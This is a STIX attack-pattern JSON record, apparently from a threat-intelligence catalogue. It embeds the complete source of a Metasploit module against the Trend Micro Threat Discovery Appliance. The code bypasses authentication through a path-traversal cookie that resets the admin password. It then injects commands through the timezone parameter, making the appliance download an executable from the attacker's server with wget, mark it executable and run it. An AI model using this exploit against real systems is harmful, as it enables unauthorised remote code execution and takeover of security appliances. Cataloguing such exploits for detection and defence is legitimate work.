{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7958760d-99a4-4416-9bed-18091f2bfe66",
    "created": "2024-08-14T17:10:32.96087Z",
    "modified": "2024-08-14T17:10:32.960874Z",
    "name": "Trend Micro Threat Discovery Appliance admin_sys_time.cgi Remote Command Execution",
    "description": " This module exploits two vulnerabilities the Trend Micro Threat Discovery Appliance. The first is an authentication bypass vulnerability via a file delete in logoff.cgi",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi.rb",
            "external_id": "trendmicro_threat_discovery_admin_sys_time_cmdi.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Trend Micro Threat Discovery Appliance admin_sys_time.cgi Remote Command Execution',\n      'Description' => %q{\n          This module exploits two vulnerabilities the Trend Micro Threat Discovery Appliance.\n          The first is an authentication bypass vulnerability via a file delete in logoff.cgi\n          which resets the admin password back to 'admin' upon a reboot (CVE-2016-7552).\n          The second is a cmdi flaw using the timezone parameter in the admin_sys_time.cgi\n          interface (CVE-2016-7547).\n\n          Note: You have the option to use the authentication bypass or not since it requires\n          that the server is rebooted. The password reset will render the authentication useless.\n          Typically, if an administrator cant login, they will bounce the box. Therefore, this\n          module performs a heartbeat request until the box is bounced and then attempts to login\n          and to perform the command injection. This module has been tested on version 2.6.1062r1\n          of the appliance.\n      },\n      'Author'       =>\n        [\n          'mr_me <steventhomasseeley@gmail.com>',    # vuln + msf\n          'Roberto Suggi Liverani @malerisch',       # vuln + msf\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'URL', 'https://asciinema.org/a/112480'], # demo\n          [ 'CVE', '2016-7552'],                      # auth bypass\n          [ 'CVE', '2016-7547'],                      # cmdi\n        ],\n      'Platform'    => 'linux',\n      'Arch'        => ARCH_X86,\n      'Privileged'  => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n        },\n      'Targets'     =>\n        [\n          [ 'Trend Micro Threat Discovery Appliance 2.6.1062r1', {} ]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-04-10'))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [true, 'The target URI', '/']),\n        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'admin']),\n        OptPort.new('SRVPORT', [ true, 'The daemon port to listen on', 1337 ]),\n        OptBool.new('AUTHBYPASS', [ true, 'Bypass the authentication', true ]),\n\n      ])\n  end\n\n  def check\n    if do_login\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'cgi-bin/about.cgi'),\n        'cookie' => @cookie,\n        'method' =>  'GET',\n        }, 1)\n      if res and res.code == 200 and res.body =~ /About Trend Micro/\n        version = \"#{$1}\" if res.body =~ /var ver_str = new String\\(\"(.*)\"\\)/\n        case version\n        when /2.6.1062/\n          return Exploit::CheckCode::Vulnerable\n        end\n      end\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if datastore['AUTHBYPASS']\n      print_status(\"Bypassing authentication...\")\n      if reset_password\n        print_good(\"The password has been reset!\")\n        print_status(\"Waiting for the administrator to reboot...\")\n        pwn_after_reboot\n      end\n    else\n      if do_login\n        pwn\n      else\n        fail_with(Failure::NoAccess, \"Authentication failed\")\n      end\n    end\n  end\n\n  def reset_password\n    c = \"session_id=../../../opt/TrendMicro/MinorityReport/etc/igsa.conf\"\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin/logoff.cgi'),\n      'method' =>  'GET',\n      'cookie' => c,\n      })\n\n    if res and res.code == 200 and res.headers.to_s =~ /Backtrace/\n      return true\n    end\n    return false\n  end\n\n  def pwn\n    start_http_server\n    print_good(\"Logged in\")\n    download_exec\n  end\n\n  def pwn_after_reboot\n    @rebooted = false\n    while !@rebooted\n      if do_login\n        @rebooted = true\n        pwn\n      end\n    end\n  end\n\n  def on_request_uri(cli, request)\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  def start_http_server\n    @pl = generate_payload_exe\n    @elf_sent = false\n\n    downfile = rand_text_alpha(8+rand(8))\n    resource_uri = '/' + downfile\n\n    # do not use SSL for the attacking web server\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n\n    if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n      srv_host = datastore['URIHOST'] || Rex::Socket.source_address(rhost)\n    else\n      srv_host = datastore['SRVHOST']\n    end\n\n    @service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri\n    service_url_payload = srv_host + resource_uri\n\n    print_status(\"#{rhost}:#{rport} - Starting up our web service on #{@service_url} ...\")\n    start_service({'Uri' => {\n      'Proc' => Proc.new { |cli, req|\n        on_request_uri(cli, req)\n      },\n      'Path' => resource_uri\n    }})\n\n    datastore['SSL'] = true if ssl_restore\n    connect\n  end\n\n  def exec(cmd)\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin/admin_sys_time.cgi'),\n      'cookie' => @cookie,\n      'method' =>  'POST',\n        'vars_post' => {\n          'act'      => 'save',\n          'timezone' => cmd,\n        }\n      }, 1)\n  end\n\n  def download_exec\n    @bd = rand_text_alpha(8+rand(8))\n    register_file_for_cleanup(\"/tmp/#{@bd}\")\n    exec(\"|`wget #{@service_url} -O /tmp/#{@bd}`\")\n    exec(\"|`chmod 755 /tmp/#{@bd}`\")\n    exec(\"|`/tmp/#{@bd}`\")\n\n    # we need to delay, for the stager\n    select(nil, nil, nil, 5)\n  end\n\n  def do_login\n\n    begin\n      login = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'cgi-bin/logon.cgi'),\n        'method' =>  'POST',\n          'vars_post' => {\n            'passwd'         => datastore['PASSWORD'],\n            'isCookieEnable' => 1,\n          }\n        })\n\n    # these are needed due to the reboot\n    rescue Rex::ConnectionRefused\n      return false\n    rescue Rex::ConnectionTimeout\n      return false\n    end\n    if login and login.code == 200 and login.body =~ /frame\\.cgi/\n      @cookie = \"session_id=#{$1};\" if login.get_cookies =~ /session_id=(.*);/\n      return true\n    end\n    return false\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-04-10",
    "x_mitre_platforms": [
        "linux'"
    ]
}